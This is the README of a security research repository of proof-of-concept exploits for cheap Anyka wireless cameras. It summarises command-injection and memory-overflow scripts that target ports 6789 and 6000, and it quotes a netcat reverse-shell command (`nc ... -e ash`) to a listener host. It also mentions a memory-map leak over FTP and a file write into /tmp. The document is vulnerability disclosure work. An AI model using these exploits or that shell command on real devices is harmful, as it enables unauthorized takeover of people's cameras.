# Anyka-Camera-Analysis

<p align="center">

  <img src="https://github.com/luke-r-m/Anyka-Camera-Analysis/assets/47477832/eda0d9a9-cd27-41bc-bf77-b49bb1a2867c" width="200">

</p>

This is a repository containing proof-of-concept exploits for getting a remote reverse shell while the Anyka camera is hosting hotspot (cheap Aliexpress camera's mostly). Also contains scripts for interacting with various open ports on the device.

## Blogs

[Analysing a Wireless Network Camera [1]: Teardown and Access Point Bugs](https://luke-m.xyz/vr/analysing_a_wireless_network_camera_part_1.md)

[Analysing a Wireless Network Camera [2]: Popping Shells](https://luke-m.xyz/vr/analysing_a_wireless_network_camera_part_2.md)

## *daemon*

These exploits/PoCs concern the daemon process running on the camera.

### daemon_6789_cmd_injection.py

This script will exploit a command injection on port 6789 hosted by the daemon process, it will execute the command `nc 192.168.10.20 123 -e ash` to set up a reverse shell for some other device listening on the network with IP 192.168.10.20 listening on port 123.

### daemon_6789_global_overflow.py

This script uses a global overflow in port 6789 handler in daemon and requests to port 8192 to leak a pointer, then exploits a stack overflow to establish a reverse shell for some other device listening on the network with IP 192.168.10.20 listening on port 123.

### daemon_6789_stack_overflow.py

This script uses the exposed FTP server to leak the `/proc/425/maps` file to get libc base address in daemon process then exploits a stack overflow to establish a reverse shell for some other device listening on the network with IP 192.168.10.20 listening on port 123

### daemon_8192_interact.py

This script simply requests to port 8192 to get some information about the camera.

## *anyka_ipc*

These exploits/PoCs concern the *anyka_ipc* process running on the camera, this process links a shared library called *libcloudapi* that exposes port 6000.

### libcloudapi_6000_ap_bind.py

This script can be used to send credentials to the camera, and it will then attempt to bind to the specified AP.

### libcloudapi_6000_ap_log.py

This script returns the length of a log file, note that the desired log directory is not created by default, so it will cause the *anyka_ipc* process to crash.

### libcloudapi_6000_ap_preview.py

This script returns some camera details.

### libcloudapi_6000_ap_update_name_file_cmd_injection.py

This script exploits a command injection in the libcloudapi hosted port 6000 to establish a reverse shell for some other device listening on the network with IP 192.168.10.20 listening on port 123.

### libcloudapi_6000_ap_update_name_file_write.py

This script allows the file with the passed filename to be written onto the device in the `/tmp` directory.
